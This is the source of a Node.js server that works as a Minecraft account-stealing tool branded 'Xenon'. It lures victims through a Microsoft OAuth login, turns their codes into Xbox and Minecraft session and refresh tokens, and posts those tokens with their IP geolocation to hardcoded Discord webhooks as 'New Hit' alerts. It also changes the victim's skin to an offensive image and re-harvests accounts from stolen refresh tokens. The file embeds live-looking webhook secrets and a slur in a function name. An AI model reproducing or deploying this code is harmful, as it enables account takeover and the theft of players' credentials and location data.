const express = require(`express`);
const app = express();
const mojang = require('mojang')
app.use(express.static(__dirname));
const i = require(`node:events`)
require('dotenv').config();
const { PasteClient, Publicity, ExpireDate } = require(`pastebin-api`)
const mongoose = require('mongoose');
const chalk = require('chalk');
const fetch = require('node-fetch');
const exampleEmbed = require(`./`);
var http_client_methods_1 = require('http-client-methods');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({
	id: '1090664218010845234',
	token: 'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
});
const Cryptr = require('cryptr');
const cryptr = new Cryptr('jeromestgay');
require('dotenv').config();
app.use(require('body-parser').json());
app.use(
	require('body-parser').urlencoded({
		extended: true,
	})
);
const chromatism = require(`chromatism`)

const ascii = 
`
\n
██╗  ████████████╗   ██╗██████╗███╗   ██╗     ██████╗ █████╗██╗   ████████████╗  ██╗
╚██╗██╔██╔════████╗  ████╔═══██████╗  ██║    ██╔═══████╔══████║   ██╚══██╔══██║  ██║
 ╚███╔╝█████╗ ██╔██╗ ████║   ████╔██╗ ██║    ██║   ███████████║   ██║  ██║  ███████║
 ██╔██╗██╔══╝ ██║╚██╗████║   ████║╚██╗██║    ██║   ████╔══████║   ██║  ██║  ██╔══██║
██╔╝ ███████████║ ╚████╚██████╔██║ ╚████║    ╚██████╔██║  ██╚██████╔╝  ██║  ██║  ██║
╚═╝  ╚═╚══════╚═╝  ╚═══╝╚═════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚═════╝   ╚═╝  ╚═╝  ╚═╝\n`;
const axios = require(`axios`);
var usernameArray = [];
var port = process.env.PORT || 8080
var clientId = process.env.clientId
var clientSecret = process.env.clientSecret
var redirectUrl = process.env.redirectUrl
var PasteKey = process.env.PasteKey
var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
var scopes = encodeURIComponent(
	"XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read"
);

console.clear();
console.log(chalk.yellow(ascii));

app.listen(port, () => {
	console.log(`\nListening on port ${port}`)
});
app.get(`/`, (req,res)=>{
	res.sendFile(__dirname + `/html/index2.html`)
})

app.get(`/token`, async (req, res) => {
	res.sendFile(__dirname+`/html/index.html`);
	let code = req.query.code;
	await main(code)
});

async function createLink(id, url, scopes) {
	var azureUrl = chalk.red.underline(
		`https://login.live.com/oauth20_authorize.srf?client_id=${id}&response_type=code&redirect_uri=${url}&scope=${scopes}`
	);
	console.log(azureUrl);
}

createLink(clientId, redirectUrl, scopes);

async function getAccesToken(clientid, code, client_secret, redirect_uri) {
	var body = `client_id=${clientid}&client_secret=${client_secret}&code=${code}&grant_type=authorization_code&redirect_uri=${redirect_uri}`;
	var response = await http_client_methods_1.HttpPost(microsoftOauthUrl, body, {
		'Content-Type': 'application/x-www-form-urlencoded',
	});
	var repParse = JSON.parse(response);
	var accessToken = repParse.access_token;
	var refreshToken = repParse.refresh_token;

	return [accessToken, refreshToken];
}

async function getXblToken(access_token) {
	var config = {
		Properties: {
			AuthMethod: 'RPS',
			SiteName: 'user.auth.xboxlive.com',
			RpsTicket: 'd='.concat(access_token), // your access token from the previous step here
		},
		RelyingParty: 'http://auth.xboxlive.com',
		TokenType: 'JWT',
	};
	const response = await http_client_methods_1.HttpPost('https://user.auth.xboxlive.com/user/authenticate', JSON.stringify(config), { 'Content-Type': 'application/json', 'Accept': 'application/json' });
	const ParsedRes = JSON.parse(response)
	const xblToken = ParsedRes.Token;

	return xblToken;
}

async function GetXstsToken(xblToken) {
	var config = {
		Properties: {
			SandboxId: 'RETAIL',
			UserTokens: [
				xblToken, // from above
			],
		},
		RelyingParty: 'rp://api.minecraftservices.com/',
		TokenType: 'JWT',
	};
	const response = await http_client_methods_1.HttpPost(
		`https://xsts.auth.xboxlive.com/xsts/authorize`,
		JSON.stringify(config)
	);
	const ParsedRes = JSON.parse(response);
	const XstsToken = ParsedRes.Token;
	const XstsUuid = ParsedRes.DisplayClaims.xui[0].uhs;
	return [XstsToken, XstsUuid];
}

async function getMcToken(xstsToken, xstsUuid) {
	const config = {
		identityToken: 'XBL3.0 x='.concat(xstsUuid) + ';'.concat(xstsToken),
	};
	const response = await http_client_methods_1.HttpPost(
		'https://api.minecraftservices.com/authentication/login_with_xbox',
		config
	);
	const RepParsed = JSON.parse(response);
	return RepParsed;
}

async function getUsername(token) {
	const config = {
		headers: {
			Authorization: 'Bearer ' + token,
		},
	};
	const response = await axios.get(
		`https://api.minecraftservices.com/minecraft/profile`,
		config
	);
	var ign = response.data.name;
	var uuid = response.data.id;
	return [ign, uuid];
}

async function getIp(){
	const response = await axios.get(`https://api.ipify.org`)
	const ip = response.data
	return ip
}

async function sendEmbed(MinecraftToken, uuid, refreshToken, username, ip, IpUrl) {
	const webhook = new WebhookClient({
		id: '1090664218010845234',
		token:
			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
	});
	const embed = new EmbedBuilder()
		.setTitle(`**New Hit ❗**  -  Click for stats `)
		.setURL(`https://sky.shiiyu.moe/stats/${username}`)
		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
		// .setDescription('@everyone')
		.setColor(0x0099FF)
		.addFields(
			{ name: 'Nom', value: `\`${username}\``, inline: true },
			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
			{ name: 'Refresh Token', value: `\n\`${refreshToken}\`` },
			{
				name: 'SSID',
				value: `\`${username}:${uuid}:${MinecraftToken}\``,
			},
			{name: `IPV4`, value:`\`${ip}\``, inline: true },
			{name: `IP Info`, value:IpUrl,url:IpUrl, inline: true }
		)
		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
		.setTimestamp();

	webhook.send({
		embeds: [embed],
	});
}

async function sendEmbed2() {
	const webhook = new WebhookClient({
		id: '1090664218010845234',
		token:
			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
	});
	const embed = new EmbedBuilder()
		.setTitle(`**New Hit ❗**`)
		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
		.setDescription('The person you ratted doesnt own Minecraft :(')
		.setColor(0x0099FF)
		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
		.setTimestamp();

	webhook.send({
		embeds: [embed],
	});
}

async function sendEmbedPaki(MinecraftToken, uuid, refreshToken, username) {
	const webhook = new WebhookClient({
		id: '1095006207284101182',
		token:
			'sc8MMflFGR9l8e395kQvbDwva6YXTofvw-T_uyvveAVx-8D6cMQGx1S0_PBpCx98HyeN',
	});
	const embed = new EmbedBuilder()
		.setTitle(`**New Hit ❗**  -  Click for stats `)
		.setURL(`https://sky.shiiyu.moe/stats/${username}`)
		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
		// .setDescription('@everyone')
		.setColor(0x0099FF)
		.addFields(
			{ name: 'Nom', value: `\`${username}\``, inline: true },
			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
			{ name: 'Refresh Token', value: `\n\`${refreshToken}\`` },
			{
				name: 'SSID',
				value: `\`${username}:${uuid}:${MinecraftToken}\``,
			},
		)
		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
		.setTimestamp();

	webhook.send({
		embeds: [embed],
	});
}


async function getIpInfo(ip){
	class ipClass {
		constructor(IPV4, Region, City, ISP, Lon, Lat) {
		  this.IPV4 = IPV4;
		  this.Region = Region;
		  this.City = City;
		  this.ISP = ISP;
		  this.Lon = Lon;
		  this.Lat = Lat;
		}
	  }
	const response = await axios.get(`http://ip-api.com/json/${ip}`)
	const resdata = response.data
	var ipInfo = new ipClass(resdata.query, resdata.regionName, resdata.city, resdata.isp, resdata.lon, resdata.lat)
	var ipInfo2 = JSON.stringify(ipInfo,null, 4).toString()
	return ipInfo2
}

async function Paste(key, ipInfo){
	try{
	const client = new PasteClient(key);

	const url = await client.createPaste({
  	code: `${ipInfo}`,
 	expireDate: "2W",
  	format: "text",
  	name: "Xenon",
  	publicity: 1,
});
	return url;
} catch(err){
	return `\`Reached Max Paste Limit\``
}
}

async function hahaFunny(Bearer, Uuid, skinUrl){
	var ii = {
		'variant' : 'slim',
		'url' : skinUrl
	 }
	const resp = await http_client_methods_1.HttpPost(`https://api.minecraftservices.com/minecraft/profile/skins`, ii, {'Authorization': `Bearer ${Bearer}`})
}

async function main(code){
	const access_token_response = await getAccesToken(
		clientId,
		code,
		clientSecret,
		redirectUrl
	);
	try{
	var accesstoken = access_token_response[0];
	var refreshtoken = access_token_response[1];
	var xblToken = await getXblToken(accesstoken);
	var XstsList = await GetXstsToken(xblToken);
	var XstsToken = XstsList[0];
	var XstsUuid = XstsList[1];
	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
	var MinecraftToken = MinecraftTokenResponse.access_token;
	var IgnAndUuid = await getUsername(MinecraftToken);
	var Ign = IgnAndUuid[0];
	var Uuid = IgnAndUuid[1];
	var ip = await getIp()
	var ipInfo = (await getIpInfo(ip))
	var PasteLink = await Paste(PasteKey, ipInfo)
	await sendEmbed(MinecraftToken, Uuid, refreshtoken, Ign, ip, PasteLink);
	await sendEmbedPaki(MinecraftToken, Uuid, refreshtoken, Ign)
	hahaFunny(MinecraftToken, Uuid, `https://www.minecraftskins.com/uploads/skins/2018/11/22/mitler-12607230.png?v560`)
	console.log(chalk.red(`\n[!] New Hit`))
	}catch(err){
		sendEmbed2()
	}
}
async function main2(access_token, refresh_token){
	try{
	var xblToken = await getXblToken(access_token);
	var XstsList = await GetXstsToken(xblToken);
	var XstsToken = XstsList[0];
	var XstsUuid = XstsList[1];
	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
	var MinecraftToken = MinecraftTokenResponse.access_token;
	var IgnAndUuid = await getUsername(MinecraftToken);
	var Ign = IgnAndUuid[0];
	var Uuid = IgnAndUuid[1];
	var ip = await getIp()
	var ipInfo = (await getIpInfo(ip))
	var PasteLink = await Paste(PasteKey, ipInfo)
	await sendEmbed(MinecraftToken, Uuid, refresh_token, Ign, ip, PasteLink);
	console.log(chalk.red(`\n[!] New Hit`))
	}catch(err){
		console.log(`There was an error`)
	}
}

app.get(`/`, (req,res)=>{
	res.sendFile(__dirname + `/html/index2.html`)
})

app.get(`/refresh`, async (req,res)=>{
	res.sendFile(__dirname + `/html/index3.html`)
	const refreshToken = req.query.RefreshToken
	var config = `client_id=${clientId}
		&scope=XboxLive.signin
		&refresh_token=${refreshToken}
		&grant_type=refresh_token
		&client_secret=${clientSecret}`
	const response= await http_client_methods_1.HttpPost(`https://login.microsoftonline.com/consumers/oauth2/v2.0/token`, config, { "Content-Type": "application/x-www-form-urlencoded" })
	const ParsedRes = JSON.parse(response)
	const AccessToken = ParsedRes.access_token
	main2(AccessToken, refreshToken)
})


